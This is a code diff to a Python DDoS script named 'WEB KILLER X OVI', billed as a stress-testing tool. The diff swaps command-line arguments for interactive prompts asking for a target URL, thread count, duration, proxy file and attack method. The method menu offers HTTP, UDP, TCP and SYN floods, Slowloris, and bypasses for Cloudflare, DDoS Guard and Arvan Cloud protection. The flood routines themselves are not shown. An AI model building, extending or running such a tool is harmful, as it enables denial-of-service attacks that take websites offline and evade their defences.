@@ -7,7 +7,6 @@ import time
 import sys
 import os
 import socket
-import argparse
 import re
 from urllib.parse import urlparse
 
@@ -21,7 +20,7 @@ C = "\033[96m"
 W = "\033[97m"
 RESET = "\033[0m"
 
-# ========== SKULL BANNER (provided by user) ==========
+# ========== SKULL BANNER ==========
 def skull_banner():
     os.system("clear")
     banner = f"""
@@ -403,7 +402,6 @@ class WebKillerX:
                 self.failed += 1
     
     def start(self):
-        # Print target info (banner already shown in main)
         print(f"{C}[+] Target:{RESET} {self.target}")
         print(f"{C}[+] Threads:{RESET} {self.threads}")
         print(f"{C}[+] Duration:{RESET} {self.duration} seconds")
@@ -459,26 +457,86 @@ class WebKillerX:
                 print(f"{C}📈 Success rate: {success_rate:.2f}%{RESET}")
 
 def main():
-    skull_banner()  # show skull banner
+    skull_banner()
     
-    parser = argparse.ArgumentParser(description="WEB KILLER X OVI - Ultimate Stress Testing Tool")
-    parser.add_argument("target", help="Target URL (e.g., https://yoursite.com)")
-    parser.add_argument("-t", "--threads", type=int, default=200, help="Number of threads (default: 200)")
-    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds (default: 60)")
-    parser.add_argument("-m", "--method", 
-                        choices=["http", "cfb", "cfbuam", "bypass", "dgb", "avb", "slow", "udp", "syn", "tcp"], 
-                        default="http", 
-                        help="Attack method: http, cfb, cfbuam, bypass, dgb, avb, slow, udp, syn, tcp (default: http)")
-    parser.add_argument("-p", "--proxy", help="Proxy file name (e.g., proxy.txt)")
+    print(f"{C}┌─[WEB KILLER X OVI]{RESET}")
+    print(f"{C}└─[Enter target URL (e.g., https://yoursite.com)]{RESET}")
+    target = input().strip()
+    if not target.startswith("http"):
+        target = "http://" + target
     
-    args = parser.parse_args()
+    threads = 200
+    try:
+        print(f"{C}[?] Number of threads (default 200):{RESET}")
+        threads_input = input().strip()
+        if threads_input:
+            threads = int(threads_input)
+    except:
+        threads = 200
+    
+    duration = 60
+    try:
+        print(f"{C}[?] Duration in seconds (default 60):{RESET}")
+        duration_input = input().strip()
+        if duration_input:
+            duration = int(duration_input)
+    except:
+        duration = 60
+    
+    use_proxy = ""
+    while use_proxy.lower() not in ["y", "n", "yes", "no"]:
+        print(f"{C}[?] Use proxies? (y/n):{RESET}")
+        use_proxy = input().strip().lower()
+    
+    proxy_file = None
+    if use_proxy.startswith("y"):
+        print(f"{C}[?] Proxy file name (e.g., proxy.txt):{RESET}")
+        proxy_file = input().strip()
+    
+    # Method selection
+    print(f"\n{C}Select attack method:{RESET}")
+    print("  1. http (HTTP Flood)")
+    print("  2. cfb (Cloudflare Bypass)")
+    print("  3. cfbuam (Cloudflare Under Attack Mode Bypass)")
+    print("  4. bypass (Generic AntiDDoS Bypass)")
+    print("  5. dgb (DDoS Guard Bypass)")
+    print("  6. avb (Arvan Cloud Bypass)")
+    print("  7. slow (Slowloris)")
+    print("  8. udp (UDP Flood)")
+    print("  9. syn (SYN Flood - simulated)")
+    print(" 10. tcp (TCP Flood)")
+    print(f"{C}Enter choice (1-10, default 1):{RESET}")
+    
+    method_choice = input().strip()
+    method_map = {
+        "1": "http",
+        "2": "cfb",
+        "3": "cfbuam",
+        "4": "bypass",
+        "5": "dgb",
+        "6": "avb",
+        "7": "slow",
+        "8": "udp",
+        "9": "syn",
+        "10": "tcp"
+    }
+    method = method_map.get(method_choice, "http")
+    
+    print(f"\n{Y}[*] Starting attack with following parameters:{RESET}")
+    print(f"    Target : {target}")
+    print(f"    Threads: {threads}")
+    print(f"    Time   : {duration} seconds")
+    print(f"    Method : {method.upper()}")
+    if proxy_file:
+        print(f"    Proxy  : {proxy_file}")
+    print()
     
     tester = WebKillerX(
-        target=args.target,
-        threads=args.threads,
-        duration=args.duration,
-        proxy_file=args.proxy,
-        method=args.method
+        target=target,
+        threads=threads,
+        duration=duration,
+        proxy_file=proxy_file,
+        method=method
     )
     tester.start()
 
